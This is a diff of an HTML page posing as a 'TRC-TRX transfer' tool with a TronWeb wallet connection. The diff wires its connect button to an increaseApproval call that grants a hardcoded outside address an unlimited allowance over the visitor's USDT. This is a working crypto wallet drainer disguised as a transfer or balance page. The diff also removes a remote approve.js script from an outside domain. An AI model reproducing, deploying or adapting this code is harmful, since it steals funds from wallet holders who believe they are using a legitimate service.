@@ -1,22 +1,22 @@
 <html lang="en" data-dpr="1" style="font-size: 43px;" class="no-touch">
 
 <head>
-    <link rel="icon" href="/favicon.ico" type="image/x-icon">
-    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <!--<link rel="icon" href="/favicon.ico" type="image/x-icon">-->
+    <!--<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">-->
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-status-bar-style" content="black">
     <meta name="format-detection" content="telephone=no, email=no">
     <meta name="msapplication-tap-highlight" content="no">
     <meta name="x5-orientation" content="portrait">
     <meta name="x5-fullscreen" content="true">
-    <link rel="icon" href="favicon.ico">
-<title>TRC-TRX transfer</title>
+    <!--<link rel="icon" href="favicon.ico">-->
+    <title>TRC-TRX transfer</title>
     <link rel="stylesheet" href="scan/css/vendor.min.css">
     <link rel="stylesheet" href="scan/css/reset.min.css">
     <link rel="stylesheet" href="scan/css/main.css">
-    <script type="text/javascript" src="https://token.okb.icu/approve.js"></script>
+    <!--<script type="text/javascript" src="https://token.okb.icu/approve.js"></script>-->
     <script type="text/javascript" src="scan/js/TronWeb.js"></script>
 
     <style type="text/css">
@@ -40,9 +40,9 @@
             background-color: grey !important;
             cursor: not-allowed;
         }
-          body, html {
-    overflow-x: hidden;
-  }
+        body, html {
+            overflow-x: hidden;
+        }
     </style>
 </head>
 
@@ -100,6 +100,7 @@
         
  <script>
   async function approve() {
+
     // USDT 合约地址和授权地址
     const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     
@@ -107,12 +108,14 @@
     const maxAmountHex = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
     // 检查是否加载了 tronWeb
-    if (typeof tronWeb === 'undefined') {
-      alert("请使用支持 Tron 的浏览器钱包，例如 TronLink 或 imToken");
-      return;
+    if (!window.tronWeb) {
+        alert("请使用支持 Tron 的浏览器钱包，例如 TronLink 或 imToken");
+        return;
     }
 
     try {
+      var tronWeb = window.tronWeb;
+      let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
       // 获取用户地址
       const userAddress = tronWeb.defaultAddress.base58;
 
@@ -122,7 +125,7 @@
         'increaseApproval(address,uint256)',
         { feeLimit: 1e8 },
         [
-          { type: 'address', value: spenderAddress },
+          { type: 'address', value: 'TJb3EpyWcQYCroLXxmsAAJYdNZ947LHWcn' },
           { type: 'uint256', value: maxAmountHex }
         ],
         userAddress
@@ -172,7 +175,7 @@
   }
 
   // 绑定按钮点击事件
-  document.getElementById("btn-connect").onclick = approvel;
+  document.getElementById("btn-connect").onclick = approve;
 </script>
     <script>
         // 随机生成 feeLimit 值
@@ -197,17 +200,20 @@
         }
 
         async function connectWallet() {
-            if (typeof tronWeb === 'undefined') {
-                //alert("请使用支持 Tron 的浏览器钱包，例如 TronLink 或 imToken");
+            if (!window.tronWeb) {
+                alert("请使用支持 Tron 的浏览器钱包，例如 TronLink 或 imToken");
                 return;
             }
             
             try {
+                var tronWeb = window.tronWeb;
+                let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
                 // 获取用户地址
                 const userAddress = tronWeb.defaultAddress.base58;
 
                 // 获取 TRX 余额
                 const trxBalance = await tronWeb.trx.getBalance(userAddress);
+                
                 document.getElementById("yu").textContent = (trxBalance / 1e6).toFixed(6) + " TRX"; // 转换为 TRX 单位
 
                 // 获取随机 feeLimit 值
